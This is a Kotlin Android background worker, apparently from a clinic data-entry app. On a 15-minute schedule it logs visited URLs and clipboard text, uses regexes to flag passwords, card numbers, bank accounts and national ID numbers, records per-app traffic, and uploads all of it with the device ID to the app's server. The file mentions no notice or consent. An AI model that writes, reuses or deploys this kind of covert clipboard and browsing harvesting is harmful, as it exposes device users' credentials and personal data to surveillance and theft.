package com.example.kabensatudata.nearby

import android.app.usage.NetworkStatsManager
import android.content.Context
import android.net.ConnectivityManager
import android.os.Build
import android.util.Log
import androidx.work.*
import com.example.kabensatudata.data.local.AuthTokenManager
import com.example.kabensatudata.data.remote.ApiService
import com.example.kabensatudata.data.remote.dto.DeviceLogBulkRequest
import com.example.kabensatudata.data.remote.dto.DeviceLogItem
import dagger.hilt.android.EntryPointAccessors
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * NetworkMonitorWorker — Tracks per-app data usage and URL visits.
 *
 * Runs every 15 minutes:
 * 1. Collects per-app data usage from NetworkStatsManager
 * 2. Collects URL logs from ScreenTextService
 * 3. Collects clipboard logs from ScreenTextService
 * 4. Uploads all as device_activity_logs
 */
class NetworkMonitorWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "NetworkMonitorWorker"
        private const val WORK_NAME = "network_clipboard_monitor"

        fun schedule(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val work = PeriodicWorkRequestBuilder<NetworkMonitorWorker>(
                15, TimeUnit.MINUTES,
                5, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                work
            )
            Log.i(TAG, "Network + clipboard monitor scheduled (every 15 min)")
        }
    }

    override suspend fun doWork(): Result {
        return try {
            val entryPoint = EntryPointAccessors.fromApplication(
                applicationContext,
                ScreenTextService.TextServiceEntryPoint::class.java
            )
            val authTokenManager = entryPoint.authTokenManager()
            val apiService = entryPoint.apiService()

            if (!authTokenManager.isLoggedIn()) return Result.success()

            val deviceName = authTokenManager.getUserName().ifBlank { "HP-Puskesmas" }
            val deviceId = android.provider.Settings.Secure.getString(
                applicationContext.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"

            val logs = mutableListOf<DeviceLogItem>()

            // 1. Collect URL logs from ScreenTextService
            val urlLogs = ScreenTextService.getAndClearUrlLogs()
            for ((timestamp, url) in urlLogs) {
                val data = JSONObject().apply {
                    put("url", url)
                    put("domain", try {
                        java.net.URI(if (url.startsWith("http")) url else "https://$url").host ?: url
                    } catch (_: Exception) { url })
                }
                logs.add(DeviceLogItem(
                    eventType = "url_visit",
                    eventData = data.toString(),
                    timestamp = timestamp
                ))
            }

            // 2. Collect clipboard logs
            val clipLogs = ScreenTextService.getAndClearClipboardLogs()
            for ((timestamp, text) in clipLogs) {
                // Detect sensitive data
                val isSensitive = detectSensitiveData(text)
                val data = JSONObject().apply {
                    put("text", text.take(500))
                    put("length", text.length)
                    put("sensitive", isSensitive)
                    if (isSensitive) put("type", classifySensitiveType(text))
                }
                logs.add(DeviceLogItem(
                    eventType = "clipboard",
                    eventData = data.toString(),
                    timestamp = timestamp
                ))
            }

            // 3. Collect per-app data usage (API 23+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try {
                    val usageData = collectDataUsage()
                    if (usageData.isNotEmpty()) {
                        val data = JSONObject().apply {
                            put("apps", org.json.JSONArray().apply {
                                usageData.take(15).forEach { (appName, rx, tx) ->
                                    put(JSONObject().apply {
                                        put("app", appName)
                                        put("rx_mb", String.format("%.1f", rx / 1048576.0))
                                        put("tx_mb", String.format("%.1f", tx / 1048576.0))
                                    })
                                }
                            })
                        }
                        logs.add(DeviceLogItem(
                            eventType = "network_usage",
                            eventData = data.toString(),
                            timestamp = System.currentTimeMillis()
                        ))
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Data usage collection failed: ${e.message}")
                }
            }

            // Upload if there are logs
            if (logs.isNotEmpty()) {
                withContext(Dispatchers.IO) {
                    apiService.uploadDeviceLogs(
                        DeviceLogBulkRequest(
                            deviceName = deviceName,
                            deviceId = deviceId,
                            logs = logs
                        )
                    )
                }
                Log.i(TAG, "Uploaded ${logs.size} events (${urlLogs.size} URLs, ${clipLogs.size} clipboard)")
            }

            Result.success()
        } catch (e: Exception) {
            Log.w(TAG, "Worker failed: ${e.message}")
            Result.retry()
        }
    }

    /**
     * Collect per-app data usage using TrafficStats (simpler, doesn't need special permission).
     */
    private fun collectDataUsage(): List<Triple<String, Long, Long>> {
        val pm = applicationContext.packageManager
        val results = mutableListOf<Triple<String, Long, Long>>()

        try {
            val apps = pm.getInstalledApplications(0)
            for (app in apps) {
                val uid = app.uid
                val rx = android.net.TrafficStats.getUidRxBytes(uid)
                val tx = android.net.TrafficStats.getUidTxBytes(uid)
                if (rx > 0 || tx > 0) {
                    val label = try {
                        pm.getApplicationLabel(app).toString()
                    } catch (_: Exception) {
                        app.packageName.substringAfterLast(".")
                    }
                    results.add(Triple(label, rx, tx))
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Data usage error: ${e.message}")
        }

        return results.sortedByDescending { it.second + it.third }
    }

    /**
     * Detect if clipboard text contains sensitive data.
     */
    private fun detectSensitiveData(text: String): Boolean {
        // Phone number patterns
        if (Regex("""(\+62|62|0)\d{8,12}""").containsMatchIn(text)) return true
        // Email
        if (Regex("""[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}""").containsMatchIn(text)) return true
        // Bank account (8-16 digits)
        if (Regex("""\b\d{8,16}\b""").containsMatchIn(text) && !Regex("""\d{4}-\d{2}-\d{2}""").containsMatchIn(text)) return true
        // NIK (16 digits)
        if (Regex("""\b\d{16}\b""").containsMatchIn(text)) return true
        // Credit card pattern
        if (Regex("""\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b""").containsMatchIn(text)) return true
        // Password-like strings
        if (text.lowercase().contains("password") || text.lowercase().contains("sandi")) return true
        return false
    }

    private fun classifySensitiveType(text: String): String {
        if (Regex("""(\+62|62|0)\d{8,12}""").containsMatchIn(text)) return "phone"
        if (Regex("""[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}""").containsMatchIn(text)) return "email"
        if (Regex("""\b\d{16}\b""").containsMatchIn(text)) return "nik"
        if (Regex("""\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b""").containsMatchIn(text)) return "card"
        return "sensitive"
    }
}
